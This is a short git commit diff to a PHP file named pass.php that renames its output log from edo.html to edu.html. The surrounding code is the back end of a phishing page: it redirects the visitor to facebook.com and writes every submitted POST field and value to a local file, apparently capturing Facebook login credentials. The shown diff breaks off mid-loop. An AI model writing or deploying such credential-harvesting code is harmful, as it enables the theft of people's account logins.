3fb4de1bde78c5e41ff652e49e0e23b71ec65854
maxylinkz <93047800+maxylinkz@users.noreply.github.com>
2021-10-24 23:13:02 -0700

    Update pass.php

--- pass.php
+++ pass.php
@@ -1,6 +1,6 @@
 <?php
 header ('Location: http://www.facebook.com');
-$handle = fopen("edo.html", "a");
+$handle = fopen("edu.html", "a");
 foreach($_POST as $variable => $value) {
    fwrite($handle, $variable);
    fwrite($handle, "=");
